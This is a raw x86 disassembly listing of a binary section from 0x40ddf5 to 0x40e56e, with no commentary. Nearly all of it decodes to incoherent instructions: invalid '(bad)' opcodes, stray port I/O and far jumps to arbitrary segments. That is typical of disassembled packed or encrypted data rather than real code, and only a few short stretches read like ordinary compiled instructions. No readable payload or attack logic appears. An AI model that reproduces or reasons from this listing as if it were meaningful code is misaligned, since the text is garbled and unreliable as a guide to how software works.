  40ddf5:	lods   al,BYTE PTR ds:[esi]
  40ddf6:	ins    BYTE PTR es:[edi],dx
  40ddf7:	repnz das 
  40ddf9:	js     0x40de73
  40ddfb:	stos   BYTE PTR es:[edi],al
  40ddfc:	mov    edx,0x538b2ce1
  40de01:	inc    edx
  40de02:	adc    bl,ch
  40de04:	cmp    DWORD PTR [edx-0x1],edi
  40de07:	add    ebp,DWORD PTR [ecx+edx*1+0x5a1590a6]
  40de0e:	xchg   edi,eax
  40de0f:	lahf   
  40de10:	xchg   DWORD PTR ds:0xbbd0ce24,edi
  40de16:	jecxz  0x40de7c
  40de18:	int3   
  40de19:	out    0x75,al
  40de1b:	and    ebp,edi
  40de1d:	xchg   esp,eax
  40de1e:	in     eax,0xcd
  40de20:	and    DWORD PTR [eax-0x62],ecx
  40de23:	dec    edx
  40de24:	sbb    ch,0x32
  40de27:	jmp    0xcffc:0x9172d29c
  40de2e:	daa    
  40de2f:	ficomp WORD PTR [esi+0x57]
  40de32:	inc    ebx
  40de33:	cmp    BYTE PTR [ebp-0x77f34d29],0x92
  40de3a:	popa   
  40de3b:	(bad)  
  40de3c:	mov    ebx,0x424b4ea8
  40de41:	out    0xa1,al
  40de43:	bts    ecx,esp
  40de46:	sbb    al,dl
  40de48:	mov    dl,BYTE PTR [ecx-0x399b96ba]
  40de4e:	cdq    
  40de4f:	xchg   DWORD PTR [edi],ebx
  40de51:	fsub   DWORD PTR [ecx-0x39d7c6fc]
  40de57:	fld    QWORD PTR [ecx+0x238a0a35]
  40de5d:	je     0x40ded5
  40de5f:	lds    esi,FWORD PTR [edi+0x492b95a7]
  40de65:	sbb    al,0x86
  40de67:	das    
  40de68:	xchg   esp,eax
  40de69:	repz push 0x8b98a76f
  40de6f:	fwait
  40de70:	mul    DWORD PTR [ebx-0x478f5a43]
  40de76:	mov    eax,0x32ec09c9
  40de7b:	or     eax,0xda44d1af
  40de80:	fucomi st,st(4)
  40de82:	xchg   ebp,eax
  40de83:	ror    BYTE PTR [edi-0x46],cl
  40de86:	mov    cl,0x7b
  40de88:	outs   dx,BYTE PTR ds:[esi]
  40de89:	pop    esp
  40de8a:	and    al,0x56
  40de8c:	enter  0xcd11,0x9d
  40de90:	cmc    
  40de91:	fisttp WORD PTR [ebp-0x2e20eadb]
  40de97:	mov    eax,DWORD PTR [ebx]
  40de99:	nop
  40de9a:	(bad)  
  40de9b:	jg     0x40de8f
  40de9d:	je     0x40df08
  40de9f:	in     al,0x9
  40dea1:	fstp   QWORD PTR [esi-0x679d33e8]
  40dea7:	push   edx
  40dea8:	(bad)  
  40dea9:	and    ch,al
  40deab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deac:	or     DWORD PTR fs:[edx+0x2a],0x9a3877f6
  40deb4:	or     al,0x5d
  40deb6:	loopne 0x40dec5
  40deb8:	jnp    0x40df2d
  40deba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40debb:	leave  
  40debc:	ins    BYTE PTR es:[edi],dx
  40debd:	xlat   BYTE PTR ds:[ebx]
  40debe:	das    
  40debf:	stc    
  40dec0:	int    0x4
  40dec2:	fucomip st,st(1)
  40dec4:	mov    ecx,0xf543956b
  40dec9:	ds jnp 0x40df35
  40decc:	pop    edi
  40decd:	dec    esp
  40dece:	mul    DWORD PTR [ebx]
  40ded0:	jecxz  0x40de5b
  40ded2:	inc    esp
  40ded3:	in     al,dx
  40ded4:	add    BYTE PTR [edi-0x43b15a4d],bh
  40deda:	fdivr  DWORD PTR [edx+esi*4+0x1b]
  40dede:	test   DWORD PTR [eax-0x13c46b77],edx
  40dee4:	or     esp,ebp
  40dee6:	out    0xd0,al
  40dee8:	inc    ebp
  40dee9:	stos   BYTE PTR es:[edi],al
  40deea:	sub    al,0x39
  40deec:	mov    bh,0x85
  40deee:	sbb    al,0xcb
  40def0:	adc    esp,ebp
  40def2:	xchg   edi,eax
  40def3:	ror    BYTE PTR [eax+0x82799f0],0xc6
  40defa:	ret    0x97e9
  40defd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40defe:	xlat   BYTE PTR ds:[ebx]
  40deff:	cmp    al,0xd3
  40df01:	sbb    al,0x6
  40df03:	or     al,0x30
  40df05:	mov    dl,0x43
  40df07:	mov    eax,0x6ae24765
  40df0c:	out    dx,eax
  40df0d:	push   ebx
  40df0e:	outs   dx,BYTE PTR ds:[esi]
  40df0f:	test   BYTE PTR [eax-0x159fddff],bh
  40df15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df16:	outs   dx,DWORD PTR ds:[esi]
  40df17:	ret    
  40df18:	out    dx,eax
  40df19:	lock rcl DWORD PTR [ebx],1
  40df1c:	sbb    ah,BYTE PTR [eax]
  40df1e:	in     al,0x75
  40df20:	adc    ebp,esp
  40df22:	mov    bh,0x83
  40df24:	cmp    eax,0x862d9f04
  40df29:	in     eax,dx
  40df2a:	sub    esp,DWORD PTR [esi-0x56]
  40df2d:	sub    eax,0x60373c05
  40df32:	enter  0xdc59,0x2d
  40df36:	out    0xc0,al
  40df38:	adc    al,0xa9
  40df3a:	jb     0x40df08
  40df3c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40df3e:	in     al,dx
  40df3f:	icebp  
  40df40:	popa   
  40df41:	imul   edi,DWORD PTR [ecx-0x10],0x9ddc4890
  40df48:	or     bl,BYTE PTR [ecx-0x4d4ef777]
  40df4e:	inc    eax
  40df4f:	cmp    DWORD PTR [edx+0x21],0x6c
  40df53:	xor    DWORD PTR [eax-0x333c581e],edx
  40df59:	xor    ch,BYTE PTR [ebx+0x39788122]
  40df5f:	xchg   edi,eax
  40df60:	push   ss
  40df61:	jl     0x40df74
  40df63:	and    DWORD PTR [esi+0x34],ecx
  40df66:	mov    bl,0x98
  40df68:	and    ebp,DWORD PTR [esi+0x32476b1a]
  40df6e:	pop    ebp
  40df6f:	repz scas al,BYTE PTR es:[edi]
  40df71:	in     eax,dx
  40df72:	push   0x6a45fa3b
  40df77:	mov    ebx,0x63ae08e6
  40df7c:	lea    edi,[esi-0x38]
  40df7f:	int3   
  40df80:	stos   BYTE PTR es:[edi],al
  40df81:	add    cl,BYTE PTR [esi+0x5d]
  40df84:	jmp    0x344f:0xbdc9ec0b
  40df8b:	sub    edx,DWORD PTR [ebx+0x5c]
  40df8e:	movups XMMWORD PTR [edi+esi*1+0x1db7ff49],xmm6
  40df96:	mov    esp,0xa6a604a2
  40df9b:	repnz sbb BYTE PTR [edx+0x4e],dh
  40df9f:	push   eax
  40dfa0:	in     eax,dx
  40dfa1:	xchg   ecx,eax
  40dfa2:	sub    bl,ah
  40dfa4:	lods   eax,DWORD PTR ds:[esi]
  40dfa5:	mov    edi,0x297f2e69
  40dfaa:	js     0x40dfbc
  40dfac:	shl    BYTE PTR [ecx],0x30
  40dfaf:	popa   
  40dfb0:	xchg   esp,eax
  40dfb1:	ds mov ah,0x9f
  40dfb4:	or     al,0xfa
  40dfb6:	and    eax,0xa2a7c6a7
  40dfbb:	call   0x33a4:0x988c469e
  40dfc2:	mov    bh,0x70
  40dfc4:	popa   
  40dfc5:	jno    0x40df65
  40dfc7:	sub    al,0x76
  40dfc9:	aam    0xf1
  40dfcb:	push   ss
  40dfcc:	mov    al,ds:0x8632e78
  40dfd1:	inc    esi
  40dfd2:	arpl   WORD PTR [ebx+0x36],si
  40dfd5:	mov    eax,0xa8aef257
  40dfda:	pop    esi
  40dfdb:	popf   
  40dfdc:	pop    ecx
  40dfdd:	cmp    esi,DWORD PTR [edx+esi*2-0x27]
  40dfe1:	pushf  
  40dfe2:	sub    al,0xa1
  40dfe4:	rcr    BYTE PTR [eax],cl
  40dfe6:	(bad)  
  40dfe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfe9:	pusha  
  40dfea:	jmp    0xf68b1abc
  40dfef:	cmp    edx,0x4c81250
  40dff5:	pop    ecx
  40dff6:	test   al,0x73
  40dff8:	and    eax,DWORD PTR [eax+esi*8+0x7]
  40dffc:	xor    al,0xf6
  40dffe:	cmp    BYTE PTR [eax+edx*8],0x14
  40e002:	add    al,0xe0
  40e004:	fs sbb eax,ecx
  40e007:	ror    DWORD PTR [ebx],1
  40e009:	add    ecx,DWORD PTR [edx+0x59]
  40e00c:	mov    eax,0x798db77a
  40e011:	mov    WORD PTR [edx-0x42],gs
  40e014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e015:	lods   eax,DWORD PTR ds:[esi]
  40e016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e018:	pop    ebp
  40e019:	gs in  eax,0x2e
  40e01c:	mov    cl,0x7
  40e01e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e01f:	inc    ebp
  40e020:	adc    eax,0x670d0c82
  40e025:	in     eax,dx
  40e026:	mul    DWORD PTR [ebx-0x3b]
  40e029:	fcmovne st,st(2)
  40e02b:	jo     0x40e009
  40e02d:	cmp    al,0xf9
  40e02f:	push   es
  40e030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e031:	pusha  
  40e032:	fst    QWORD PTR [ebp+eax*1+0x29b395c2]
  40e039:	sub    eax,DWORD PTR [ebx+0x5d543a97]
  40e03f:	and    ebp,ebx
  40e041:	jnp    0x40e0b4
  40e043:	sbb    eax,0xbb51b31a
  40e048:	aaa    
  40e049:	out    0x29,eax
  40e04b:	cmp    esp,DWORD PTR [ecx-0xcc671e]
  40e051:	add    ecx,ebx
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434396
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x1f85baa7
  40e071:	xor    dh,BYTE PTR [edi]
  40e073:	stc    
  40e074:	xchg   edx,eax
  40e075:	jo     0x40e0e7
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0c4
  40e07c:	in     eax,0x6d
  40e07e:	jle    0x40e062
  40e080:	iret   
  40e081:	icebp  
  40e082:	mov    ch,0x7e
  40e084:	js     0x40e07c
  40e086:	jns    0x40e020
  40e088:	mov    bh,0x2f
  40e08a:	xchg   ebp,eax
  40e08b:	lods   al,BYTE PTR ds:[esi]
  40e08c:	aaa    
  40e08d:	call   0xb6c5:0x18579e16
  40e094:	imul   ecx,DWORD PTR [ecx],0x15
  40e097:	nop
  40e098:	inc    ebx
  40e099:	inc    edx
  40e09a:	imul   ebp,DWORD PTR [edi+0x1526a655],0x71
  40e0a1:	or     ebx,DWORD PTR [ecx]
  40e0a3:	inc    edi
  40e0a4:	xor    ah,BYTE PTR [ebx-0x1d]
  40e0a7:	stc    
  40e0a8:	cwde   
  40e0a9:	retf   
  40e0aa:	push   0x3c
  40e0ac:	jle    0x40e125
  40e0ae:	cmp    al,0x87
  40e0b0:	dec    edi
  40e0b1:	inc    ecx
  40e0b2:	jl     0x40e0c4
  40e0b4:	ss dec ecx
  40e0b6:	pop    ebp
  40e0b7:	shr    eax,cl
  40e0b9:	xchg   ebp,eax
  40e0ba:	dec    esp
  40e0bb:	(bad)  
  40e0bc:	loopne 0x40e12f
  40e0be:	pop    esp
  40e0bf:	pushf  
  40e0c0:	lahf   
  40e0c1:	mov    ah,0x3a
  40e0c3:	xor    dh,BYTE PTR [esi+ebp*2+0x4e]
  40e0c7:	out    dx,al
  40e0c8:	push   ebp
  40e0c9:	scas   al,BYTE PTR es:[edi]
  40e0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0cb:	pop    ecx
  40e0cc:	cwde   
  40e0cd:	cmp    cl,ah
  40e0cf:	(bad)  
  40e0d0:	mov    eax,0xdbddd75b
  40e0d5:	(bad)  
  40e0d6:	mov    edx,0x5a8de23e
  40e0db:	dec    ebx
  40e0dc:	adc    eax,0xa8599000
  40e0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e2:	mov    ecx,0xdc50e7e1
  40e0e7:	daa    
  40e0e8:	cmp    al,0x9c
  40e0ea:	jno    0x40e08a
  40e0ec:	mov    bl,0x12
  40e0ee:	mov    esp,0x5c52bf0d
  40e0f3:	in     al,dx
  40e0f4:	dec    edi
  40e0f5:	sbb    eax,0xd2964c6b
  40e0fa:	push   esi
  40e0fb:	cdq    
  40e0fc:	inc    edi
  40e0fd:	push   0x1fd415bc
  40e102:	lock aad 0xee
  40e105:	mov    edx,0xae996d42
  40e10a:	push   0xbf85d41e
  40e10f:	stos   BYTE PTR es:[edi],al
  40e110:	sbb    eax,0x31d50623
  40e115:	ins    DWORD PTR es:[edi],dx
  40e116:	mov    al,0xe0
  40e118:	adc    edi,DWORD PTR [esi]
  40e11a:	mov    edi,0xb1c43b32
  40e11f:	mov    cl,0x7a
  40e121:	dec    esi
  40e122:	jge    0x40e0d8
  40e124:	xchg   ebp,eax
  40e125:	lods   eax,DWORD PTR ds:[esi]
  40e126:	dec    ebp
  40e127:	jge    0x40e178
  40e129:	add    al,0x2d
  40e12b:	add    ah,0x56
  40e12e:	in     eax,0x10
  40e130:	mov    al,ds:0xc60cdf95
  40e135:	jnp    0x40e15a
  40e137:	stos   DWORD PTR es:[edi],eax
  40e138:	(bad)  
  40e139:	push   ebp
  40e13a:	(bad)  
  40e13b:	mov    eax,0xe30b56b8
  40e140:	and    bh,BYTE PTR [ecx]
  40e142:	sahf   
  40e143:	mov    fs,WORD PTR [edx-0x1a]
  40e146:	xchg   ebx,eax
  40e147:	fst    DWORD PTR [edx]
  40e149:	and    BYTE PTR [ecx],0xe9
  40e14c:	cmp    al,0x54
  40e14e:	sub    DWORD PTR [edi],eax
  40e150:	dec    esp
  40e151:	rcr    BYTE PTR [eax+0x15932b2e],0x2b
  40e158:	mov    ch,ch
  40e15a:	sahf   
  40e15b:	jle    0x40e1a3
  40e15d:	addr16 xor al,0xf
  40e160:	jge    0x40e145
  40e162:	mov    ch,0xf8
  40e164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e165:	xor    DWORD PTR [ebx],eax
  40e167:	ror    edi,1
  40e169:	(bad)  
  40e16a:	cmp    ebx,DWORD PTR [eiz*8-0x2f5917fc]
  40e171:	popa   
  40e172:	call   0x1d26:0x8a2a6171
  40e179:	mov    BYTE PTR [esp+edx*8+0x52],dl
  40e17d:	mov    ecx,0x7d7d0e41
  40e182:	jp     0x40e1d5
  40e184:	scas   al,BYTE PTR es:[edi]
  40e185:	jbe    0x40e1f1
  40e187:	(bad)  
  40e189:	mov    ah,0xf2
  40e18b:	test   eax,0x7bc27b75
  40e190:	xor    esp,DWORD PTR [eax-0x4be25297]
  40e196:	ret    0x179c
  40e199:	neg    ebx
  40e19b:	inc    ecx
  40e19c:	sbb    eax,0x92545703
  40e1a1:	loope  0x40e18c
  40e1a3:	dec    ecx
  40e1a4:	pop    ecx
  40e1a5:	idiv   DWORD PTR [ebp-0x57aacafa]
  40e1ab:	je     0x40e1c7
  40e1ad:	push   eax
  40e1ae:	jo     0x40e198
  40e1b0:	xor    esp,DWORD PTR [edx]
  40e1b2:	mov    bl,0x7e
  40e1b4:	mov    eax,0x45c9f896
  40e1b9:	jne    0x40e140
  40e1bb:	mov    ds:0xf6ca25b5,al
  40e1c0:	fucom  st(6)
  40e1c2:	and    eax,0xd9fc67ab
  40e1c7:	push   esi
  40e1c8:	push   0x6f9146ed
  40e1cd:	aam    0x52
  40e1cf:	popa   
  40e1d0:	sbb    dh,bl
  40e1d2:	pusha  
  40e1d3:	mov    ecx,0x20290542
  40e1d8:	dec    edx
  40e1d9:	rol    BYTE PTR [ecx+ebx*2-0x34],0xd
  40e1de:	fild   WORD PTR [edx]
  40e1e0:	ror    BYTE PTR [ebp-0x213ffef4],0xbf
  40e1e7:	ins    BYTE PTR es:[edi],dx
  40e1e8:	int3   
  40e1e9:	sub    ebp,edx
  40e1eb:	add    BYTE PTR [ecx],al
  40e1ed:	adc    eax,0x8e15614
  40e1f2:	cmp    eax,0xf15d7959
  40e1f7:	jmp    0xab23:0x7e6f5ea0
  40e1fe:	dec    edi
  40e1ff:	xchg   edx,eax
  40e200:	sbb    DWORD PTR [ecx+0x30c2c1b6],esi
  40e206:	xor    BYTE PTR [eax+0x2aa5d120],dh
  40e20c:	jbe    0x40e204
  40e20e:	add    eax,0xbcb190d6
  40e213:	xor    ebp,DWORD PTR ds:0x511a2e71
  40e219:	add    al,0x5c
  40e21b:	or     bl,BYTE PTR [edi]
  40e21d:	enter  0xca28,0xc3
  40e221:	mov    ds:0x45a3fd38,eax
  40e226:	imul   eax,esi,0xf5d6eae8
  40e22c:	out    0x9b,eax
  40e22e:	lds    ecx,FWORD PTR [esi+0x14f50ec2]
  40e234:	mov    al,0x8c
  40e236:	scas   al,BYTE PTR es:[edi]
  40e237:	nop
  40e238:	mov    dl,0xab
  40e23a:	(bad)  
  40e23b:	mov    ecx,0x8c7206c4
  40e240:	dec    esp
  40e241:	pop    ebx
  40e242:	xor    DWORD PTR [ebx-0x73],ecx
  40e245:	pop    edi
  40e246:	std    
  40e247:	fadd   QWORD PTR [eax-0x15]
  40e24a:	div    dh
  40e24c:	mov    esi,0x3a604045
  40e251:	scas   eax,DWORD PTR es:[edi]
  40e252:	stos   DWORD PTR es:[edi],eax
  40e253:	(bad)  
  40e254:	add    eax,0x6737db03
  40e259:	pop    ss
  40e25a:	xchg   edx,eax
  40e25b:	scas   eax,DWORD PTR es:[edi]
  40e25c:	jo     0x40e282
  40e25e:	or     bl,BYTE PTR [edi]
  40e260:	fidivr WORD PTR [edi-0x7d]
  40e263:	sub    ecx,DWORD PTR [esi+0x2c]
  40e266:	paddusw mm1,QWORD PTR [ebx]
  40e269:	ret    0x53e9
  40e26c:	or     al,BYTE PTR [ecx]
  40e26e:	push   edx
  40e26f:	xchg   edx,eax
  40e270:	fsub   DWORD PTR [edx-0x643c6cc6]
  40e276:	addr16 inc eax
  40e278:	cmp    eax,0xe17b6bb7
  40e27d:	into   
  40e27e:	in     eax,dx
  40e27f:	jo     0x40e2fc
  40e281:	push   0x8
  40e283:	lods   eax,DWORD PTR ds:[esi]
  40e284:	(bad)  
  40e285:	push   es
  40e286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e287:	sbb    DWORD PTR [esi+0xa],eax
  40e28a:	shl    BYTE PTR [esi+0x244a9a9],0xc
  40e291:	or     eax,edi
  40e293:	xor    al,0xf
  40e295:	mov    al,ds:0xd982e618
  40e29a:	adc    dl,BYTE PTR [eax+ecx*2+0x7]
  40e29e:	push   esi
  40e29f:	gs jp  0x40e2c9
  40e2a2:	add    eax,0xf95bb356
  40e2a7:	(bad)  
  40e2a8:	cli    
  40e2a9:	int3   
  40e2aa:	mul    DWORD PTR [ecx+0xa]
  40e2ad:	xrelease mov DWORD PTR [edx],eax
  40e2b0:	sub    al,BYTE PTR [eax+0x57]
  40e2b3:	dec    edx
  40e2b4:	mov    ecx,0x7cd53c82
  40e2b9:	jmp    0xfb1a:0x1d007d6d
  40e2c0:	fsub   st(5),st
  40e2c2:	stos   DWORD PTR es:[edi],eax
  40e2c3:	cs cwde 
  40e2c5:	mov    ebp,0xf2d9c4bf
  40e2ca:	push   cs
  40e2cb:	or     BYTE PTR [eax-0x31cce669],cl
  40e2d1:	inc    edx
  40e2d2:	inc    edi
  40e2d3:	in     al,0xcd
  40e2d5:	loope  0x40e26d
  40e2d7:	xchg   edi,eax
  40e2d8:	or     cl,BYTE PTR [ebp+0x34fb096f]
  40e2de:	pop    edx
  40e2df:	imul   edx,DWORD PTR [ebx+0x8],0xdbf82cdd
  40e2e6:	ins    BYTE PTR es:[edi],dx
  40e2e7:	int    0xf6
  40e2e9:	in     eax,dx
  40e2ea:	ror    edi,0xd3
  40e2ed:	test   eax,0x71577f24
  40e2f2:	shl    ebx,0x7e
  40e2f5:	mov    ch,0x98
  40e2f7:	test   al,0x4
  40e2f9:	ins    DWORD PTR es:[edi],dx
  40e2fa:	fidivr DWORD PTR [ebp+0x28050647]
  40e300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e301:	mov    edx,0x20fdbe2a
  40e306:	dec    edx
  40e307:	pop    esi
  40e308:	shl    BYTE PTR [ecx-0x61],1
  40e30b:	xor    ebx,DWORD PTR [ecx-0x42]
  40e30e:	sub    ch,cl
  40e310:	gs add eax,0x31ee1006
  40e316:	leave  
  40e317:	dec    eax
  40e318:	and    al,0xed
  40e31a:	out    dx,al
  40e31b:	lds    edx,FWORD PTR [esi-0x7334dbd9]
  40e321:	imul   esi,DWORD PTR [eax-0x7bd9eb6a],0x2b
  40e328:	pop    es
  40e329:	ds push edi
  40e32b:	fisttp DWORD PTR [esi]
  40e32d:	pop    esi
  40e32e:	les    ecx,FWORD PTR [esi-0x1d93b6d6]
  40e334:	test   al,0x12
  40e336:	sub    ch,BYTE PTR [ecx]
  40e338:	pop    edi
  40e339:	mov    fs,edi
  40e33b:	sub    esp,ebp
  40e33d:	and    eax,0xe5a0dc93
  40e342:	sbb    cl,BYTE PTR [edx+0x74]
  40e345:	pushf  
  40e346:	sub    al,0x80
  40e348:	fimul  WORD PTR ds:0x3f0a6631
  40e34e:	push   ecx
  40e34f:	(bad)  
  40e350:	rol    DWORD PTR [eax],cl
  40e352:	dec    esp
  40e353:	mov    edi,0x4becc727
  40e358:	dec    ecx
  40e359:	imul   ebx,ebx,0x2c
  40e35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e35d:	sbb    dl,al
  40e35f:	add    cl,BYTE PTR [edi-0x2d190047]
  40e365:	dec    ecx
  40e366:	mov    eax,0x169bf726
  40e36b:	aam    0xf5
  40e36d:	shl    DWORD PTR [ebp+0x66488d66],cl
  40e373:	(bad)
  40e376:	add    eax,0xd92ea45a
  40e37b:	mov    cl,0x87
  40e37d:	pop    ebp
  40e37e:	dec    edx
  40e37f:	mov    edx,0x14465284
  40e384:	ret    0xd879
  40e387:	pop    eax
  40e388:	out    0x98,al
  40e38a:	cld    
  40e38b:	sbb    BYTE PTR [ecx-0x1e],dl
  40e38e:	(bad)  
  40e38f:	icebp  
  40e390:	inc    eax
  40e391:	and    ch,BYTE PTR [edi+0x1e]
  40e394:	or     eax,0xca22c75e
  40e399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e39a:	rol    bh,1
  40e39c:	pop    eax
  40e39d:	ficom  DWORD PTR [edi+0xd]
  40e3a0:	xchg   BYTE PTR [ecx+ecx*2-0x30561001],cl
  40e3a7:	std    
  40e3a8:	or     al,bl
  40e3aa:	aas    
  40e3ab:	dec    eax
  40e3ac:	cmc    
  40e3ad:	add    eax,0x3b41b1c
  40e3b2:	jmp    FWORD PTR [eax+0x58c39356]
  40e3b8:	xchg   esi,eax
  40e3b9:	ret    
  40e3ba:	jecxz  0x40e392
  40e3bc:	out    0xb2,eax
  40e3be:	push   edi
  40e3bf:	les    ebx,FWORD PTR [esi+0x3709e03b]
  40e3c5:	pop    es
  40e3c6:	test   DWORD PTR [ebx],esi
  40e3c8:	pop    edi
  40e3c9:	test   eax,0xea2b15ce
  40e3ce:	dec    edx
  40e3cf:	mov    ah,0x2c
  40e3d1:	pop    ss
  40e3d2:	fs xor esp,DWORD PTR gs:[ecx]
  40e3d6:	xor    eax,DWORD PTR [edi-0x4b]
  40e3d9:	pop    ecx
  40e3da:	rcr    esi,cl
  40e3dc:	cmp    DWORD PTR [eax-0x55],esp
  40e3df:	push   esi
  40e3e0:	out    0x9,al
  40e3e2:	pop    eax
  40e3e3:	and    eax,0x6ecb71e
  40e3e8:	mov    cl,0xf0
  40e3ea:	iret   
  40e3eb:	cli    
  40e3ec:	xchg   BYTE PTR [edi+0x26],ah
  40e3ef:	in     eax,dx
  40e3f0:	dec    ecx
  40e3f1:	aaa    
  40e3f2:	push   edx
  40e3f3:	out    0x3e,eax
  40e3f5:	jge    0x40e3c9
  40e3f7:	mov    dl,0xce
  40e3f9:	ins    DWORD PTR es:[edi],dx
  40e3fa:	xchg   esp,eax
  40e3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3fc:	arpl   sp,dx
  40e3fe:	leave  
  40e3ff:	arpl   bx,sp
  40e401:	mov    edx,0x2b7c3216
  40e406:	popf   
  40e407:	and    edx,ebx
  40e409:	xor    al,BYTE PTR [ebp-0x79]
  40e40c:	les    ebx,FWORD PTR [ecx+0x79590bba]
  40e412:	ins    BYTE PTR es:[edi],dx
  40e413:	mov    dh,0x21
  40e415:	ja     0x40e438
  40e417:	scas   al,BYTE PTR es:[edi]
  40e418:	pop    es
  40e419:	leave  
  40e41a:	jge    0x40e3f0
  40e41c:	and    BYTE PTR [eax+0x7932b5e2],bh
  40e422:	and    eax,0x78d610b8
  40e427:	add    al,0xa9
  40e429:	cld    
  40e42a:	adc    al,bl
  40e42c:	(bad)  
  40e42d:	and    ebx,DWORD PTR [ecx]
  40e42f:	fbstp  TBYTE PTR [ebx-0x36]
  40e432:	inc    edi
  40e433:	sbb    ebp,DWORD PTR [esi+0x69f8f17c]
  40e439:	out    0x75,eax
  40e43b:	dec    ecx
  40e43c:	jae    0x40e3c4
  40e43e:	jae    0x41bbdf63
  40e444:	ret    
  40e445:	into   
  40e446:	dec    ebx
  40e447:	mov    dl,0xab
  40e449:	and    eax,0x486956dd
  40e44e:	shl    BYTE PTR [ebx+ebp*4-0x1a],cl
  40e452:	je     0x40fd56
  40e458:	movzx  eax,BYTE PTR ds:0x434382
  40e45f:	add    DWORD PTR ds:0x43441d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432dda,0x4326f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432dc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434392,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	or     BYTE PTR [ebp-0x612db3fe],0x70
  40e4c0:	jo     0x40e50b
  40e4c2:	jge    0x40e534
  40e4c4:	jo     0x40e538
  40e4c6:	mov    ah,0xf
  40e4c8:	push   cs
  40e4c9:	pop    ebx
  40e4ca:	mov    ebp,0x78153a0b
  40e4cf:	jb     0x40e468
  40e4d1:	adc    dh,bh
  40e4d3:	fisttp QWORD PTR [edi-0x5cf510c3]
  40e4d9:	bound  ebp,QWORD PTR [esi+0x268e41c7]
  40e4df:	mov    dl,0x2c
  40e4e1:	adc    BYTE PTR ds:0xb7e8a5de,bh
  40e4e7:	bnd ret 
  40e4e9:	pop    es
  40e4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4eb:	js     0x40e55d
  40e4ed:	neg    BYTE PTR [esi-0x38ef71e1]
  40e4f3:	ins    DWORD PTR es:[edi],dx
  40e4f4:	cdq    
  40e4f5:	jecxz  0x40e4ea
  40e4f7:	mov    al,ds:0xb3ccdecd
  40e4fc:	ficomp WORD PTR [eax]
  40e4fe:	leave  
  40e4ff:	loope  0x40e486
  40e501:	sar    BYTE PTR [esi],1
  40e503:	sbb    bh,BYTE PTR [eax+0x3ffdc283]
  40e509:	nop
  40e50a:	call   0x52b:0x91b10b8e
  40e511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e512:	push   ss
  40e513:	lods   al,BYTE PTR ds:[esi]
  40e514:	jmp    0xcef5:0xd843c64d
  40e51b:	adc    eax,0x25b701ce
  40e520:	or     esp,DWORD PTR [edx]
  40e522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e523:	xchg   esp,eax
  40e524:	push   ecx
  40e525:	xchg   DWORD PTR [ebx+0x7f],ebp
  40e528:	mov    BYTE PTR [ecx+0x67d6909b],dh
  40e52e:	or     al,BYTE PTR [ebp-0x4b]
  40e531:	dec    ebx
  40e532:	cdq    
  40e533:	(bad)  
  40e534:	jne    0x40e4c9
  40e536:	pop    edi
  40e537:	inc    edx
  40e538:	push   ecx
  40e539:	mul    DWORD PTR [edx]
  40e53b:	sbb    dl,BYTE PTR [esi]
  40e53d:	adc    BYTE PTR [esi+edi*1+0x5a4ecf97],ch
  40e544:	pop    ebp
  40e545:	mov    ah,BYTE PTR [ecx-0x4a2fc079]
  40e54b:	ja     0x40e4f1
  40e54d:	pop    edx
  40e54e:	add    eax,0x8a876309
  40e553:	jle    0x40e519
  40e555:	and    BYTE PTR [eax+0x66e1c2c],dl
  40e55b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e55c:	aam    0xc1
  40e55e:	aaa    
  40e55f:	pop    ebx
  40e560:	and    al,0xdc
  40e562:	outs   dx,DWORD PTR ds:[esi]
  40e563:	int    0x28
  40e565:	mov    ds:0xb57f3898,al
  40e56a:	loop   0x40e59b
  40e56c:	jns    0x40e56e
  40e56e:	test   eax,0xd238d5b3
